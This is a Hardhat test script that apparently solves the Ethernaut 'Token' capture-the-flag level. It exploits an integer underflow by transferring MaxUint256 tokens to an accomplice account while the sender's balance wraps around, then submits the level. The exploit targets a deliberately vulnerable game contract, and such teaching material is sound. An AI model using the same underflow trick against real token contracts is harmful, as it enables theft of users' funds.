import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;

let accounts: Signer[];
let eoa: Signer;
let accomplice: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, accomplice] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Token`);
  const challengeAddress = await createChallenge(
    `0x63bE8347A617476CA461649897238A31835a32CE`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  let val = ethers.constants.MaxUint256
  await challenge.connect(eoa).transfer(await accomplice.getAddress(),val)

  console.log(await challenge.balanceOf(await eoa.getAddress())) // overflow loops around so eoa keeps same num. tokens
  console.log(await challenge.balanceOf(await accomplice.getAddress())) // MaxUint256 tokens

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
